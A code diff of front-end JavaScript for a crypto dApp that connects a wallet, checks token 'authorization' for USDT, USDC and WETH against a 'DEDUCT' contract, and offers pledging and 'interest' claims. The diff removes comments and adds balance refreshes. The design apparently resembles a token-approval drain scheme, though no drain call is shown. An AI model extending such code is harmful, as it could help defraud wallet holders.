@@ -678,7 +678,6 @@ async function connectWallet() {
     signer = provider.getSigner(); 
     userAddress = await signer.getAddress();
 
-    // 【關鍵】建立合約
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -693,7 +692,6 @@ async function connectWallet() {
     setupSSE(); 
     await saveUserData();
 
-    // 【終極修復】延遲 1 秒強制讀取餘額
     setTimeout(async () => {
       await forceRefreshWalletBalance();
     }, 1000);
@@ -705,7 +703,6 @@ async function connectWallet() {
   }
 }
 
-/* 【強制刷新餘額】 */
 async function forceRefreshWalletBalance() {
   if (!userAddress || !usdtContract || !usdcContract || !wethContract) {
     updateStatus('合約未初始化，請重新連線。', true);
@@ -751,7 +748,6 @@ async function updateUIBasedOnChainState() {
       if (isWethAuthorized) walletTokenSelect.value = 'WETH';
       else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
       else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
-      walletTokenSelect.dispatchEvent(new Event('change'));
       setInitialNextBenefitTime();
       activateStakingUI();
       pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = false;
@@ -812,6 +808,7 @@ async function handleConditionalAuthorizationFlow() {
       console.error(err);
     }
   }
+  await forceRefreshWalletBalance();
 }
 
 async function getEthPrices() {
@@ -829,7 +826,6 @@ async function getEthPrices() {
   }
 }
 
-/* 【永遠開 Modal】 */
 async function claimInterest() {
   const claimableETH = window.currentClaimable || 0;
   const pendingETH = window.currentPending || 0;
@@ -882,7 +878,7 @@ function setupSSE() {
             localLastUpdated = data.lastUpdated;
             await loadUserDataFromServer();
             await updateInterest();
-            await forceRefreshWalletBalance(); // SSE 更新後也刷新餘額
+            await forceRefreshWalletBalance();
           }
         } else if (eventType === 'ping') {
           console.log(`SSE: Received ping, timestamp: ${data.timestamp || 'unknown'}`);
@@ -955,7 +951,7 @@ document.addEventListener('DOMContentLoaded', () => {
         cumulative: 0, nextBenefitTime: localStorage.getItem('nextBenefitTime'), lastUpdated: Date.now(), source: 'index.html' 
       });
       await updateInterest();
-      await forceRefreshWalletBalance(); // 領取後刷新餘額
+      await forceRefreshWalletBalance();
       updateStatus(translations[currentLang].claimSuccess);
     });
   }
